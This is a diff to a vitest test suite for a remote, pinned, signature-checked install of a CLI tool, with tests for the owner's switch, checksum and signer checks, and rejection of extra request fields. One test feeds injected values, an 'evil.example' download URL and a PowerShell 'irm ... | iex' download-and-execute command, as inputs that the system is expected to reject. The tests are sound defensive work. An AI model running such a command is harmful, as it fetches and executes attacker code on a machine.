@@ -1,7 +1,7 @@
 import { createServer, type Server } from "node:http";
 import { once } from "node:events";
-import { randomUUID } from "node:crypto";
-import { mkdtempSync, readFileSync, readdirSync, rmSync, statSync } from "node:fs";
+import { createHash, randomUUID } from "node:crypto";
+import { mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve, sep } from "node:path";
 import { afterEach, describe, expect, it, vi } from "vitest";
@@ -10,7 +10,7 @@ import { RuntimeClientStore } from "../src/runtime-client-store.js";
 import { RuntimeCoordinator } from "../src/runtime-coordinator.js";
 import { credentialProfilesRoot } from "../src/runtime-credential-profiles.js";
 import { AUDIT_FILE, setRemoteSwitch } from "../src/runtime-remote-setup.js";
-import { CliInstallError, isInstallableCli } from "../src/runtime-cli-install.js";
+import { CliInstallError, DOWNLOAD_COMMAND, INSTALLABLE_CLIS, isInstallableCli, managedCliExecutable, managedInstaller } from "../src/runtime-cli-install.js";
 import type { WindowsCliProbe, WindowsCliTask } from "../src/windows-cli.js";
 
 // #3190 Part 3b: the server asks a computer to install a CLI through `callAccount` (an account.request frame that is NOT journaled), and the Runtime's
@@ -250,5 +250,60 @@ describe("callAccount: the capability gate stops the frame before it is written"
     }
     expect(send).not.toHaveBeenCalled();
     expect(frameTypes(send)).toEqual([]); expect(inside(f.hub).accountPending.size).toBe(0);
+  });
+});
+
+// AGEND-135 (#3521): Antigravity through the whole stack — real coordinator, real Runtime client and socket, the real installer with a fake PowerShell and a small pin of the same shape
+// (the real pin is a 225 MB file). The dashboard sends the id; the Runtime's owner's switch, the pin, the checksum and the signer decide.
+describe("Antigravity: a pinned download through the server's account.request", () => {
+  const body = Buffer.from("MZ-this-stands-for-agy.exe"), pin = { ...INSTALLABLE_CLIS.antigravity, bytes: body.length, sha512: createHash("sha512").update(body).digest("hex") };
+  const GOOGLE = 'CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US';
+  const stack = (options: { content?: Buffer; subject?: string; status?: string } = {}) => {
+    const downloads: Array<{ url?: string; args: string[] }> = [];
+    const root = join(scratch(), "cli");
+    const installer = managedInstaller({ root, nodePath: join(root, "no-node.exe"), pins: { antigravity: pin },
+      run: async (_file, args, { env }) => { downloads.push({ ...(env.AGEND_DOWNLOAD_URL ? { url: env.AGEND_DOWNLOAD_URL } : {}), args }); writeFileSync(env.AGEND_DOWNLOAD_FILE!, options.content ?? body); return { code: 0, stdout: "" }; },
+      signerOf: async () => ({ status: options.status ?? "Valid", subject: options.subject ?? GOOGLE }) });
+    return { downloads, root, remoteAccounts: { find: async () => null, environment: () => ({}), installer } };
+  };
+  it("refuses while the computer's owner has not turned the switch on: nothing is downloaded", async () => {
+    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts });
+    await expect(f.hub.callAccount(f.machineId, "cli.install", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/"install" turned off.*agend-runtime remote-setup install on/);
+    expect(s.downloads).toEqual([]);
+    expect(audit(f.dir).map(line => JSON.parse(line)).map(line => `${line.outcome}|${line.reason}`)).toEqual(["refused|switch_off"]);
+  });
+  it("with the switch on: downloads the pinned file, verifies it, records it, and answers with the pinned version", async () => {
+    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts });
+    setRemoteSwitch(f.dir, "install", true, 3_600_000);
+    expect(await f.hub.callAccount(f.machineId, "cli.install", { cli: "antigravity", actor: ACTOR })).toEqual({ version: "1.5.3" });
+    expect(s.downloads).toEqual([{ url: pin.url, args: ["-NoProfile", "-NonInteractive", "-Command", DOWNLOAD_COMMAND] }]);
+    expect(managedCliExecutable(s.root, "antigravity")).toMatchObject({ version: "1.5.3" });
+    expect(audit(f.dir).map(line => JSON.parse(line)).map(line => `${line.action}|${line.outcome}|${line.cli}`)).toEqual(["cli.install|started|antigravity", "cli.install|ok|antigravity"]);
+  });
+  it("a file whose checksum is not the pin's, or that someone else signed, is refused with the reason, and nothing is installed", async () => {
+    const wrong = stack({ content: Buffer.from(body.map(b => b ^ 1)) }), f1 = await fixture({ remoteAccounts: wrong.remoteAccounts });
+    setRemoteSwitch(f1.dir, "install", true, 3_600_000);
+    await expect(f1.hub.callAccount(f1.machineId, "cli.install", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/checksum differs.*nothing was installed/);
+    expect(managedCliExecutable(wrong.root, "antigravity")).toBeNull();
+    expect(audit(f1.dir).map(line => JSON.parse(line)).map(line => `${line.outcome}|${line.reason}`)).toEqual(["started|undefined", "failed|failed"]);
+    const other = stack({ subject: 'CN=Someone Else, O=Someone Else' }), f2 = await fixture({ remoteAccounts: other.remoteAccounts });
+    setRemoteSwitch(f2.dir, "install", true, 3_600_000);
+    await expect(f2.hub.callAccount(f2.machineId, "cli.install", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/not signed by the expected publisher/);
+    expect(managedCliExecutable(other.root, "antigravity")).toBeNull();
+  });
+  it("the request is closed: an address, a version, a hash or a command in it is refused before any frame is written", async () => {
+    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts }), send = vi.spyOn(f.hub as unknown as { send(connection: unknown, value: unknown): void }, "send");
+    setRemoteSwitch(f.dir, "install", true, 3_600_000);
+    for (const extra of [{ url: "https://evil.example/agy.exe" }, { version: "9.9.9" }, { sha512: "0".repeat(128) }, { command: "irm https://evil.example | iex" }]) {
+      await expect(f.hub.callAccount(f.machineId, "cli.install", { cli: "antigravity", actor: ACTOR, ...extra } as never)).rejects.toThrow(/unknown field/);
+    }
+    expect(send).not.toHaveBeenCalled(); expect(s.downloads).toEqual([]);
+  });
+  it("Grok, Muse and Kiro are not in the Runtime's table: they are refused by the Runtime itself, before `started`", async () => {
+    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts });
+    setRemoteSwitch(f.dir, "install", true, 3_600_000);
+    for (const cli of ["grok", "muse", "kiro-cli"]) await expect(f.hub.callAccount(f.machineId, "cli.install", { cli, actor: ACTOR })).rejects.toThrow(/not in this Runtime's install list/);
+    expect(s.downloads).toEqual([]);
+    expect(audit(f.dir).map(line => JSON.parse(line).outcome)).not.toContain("started");
   });
 });
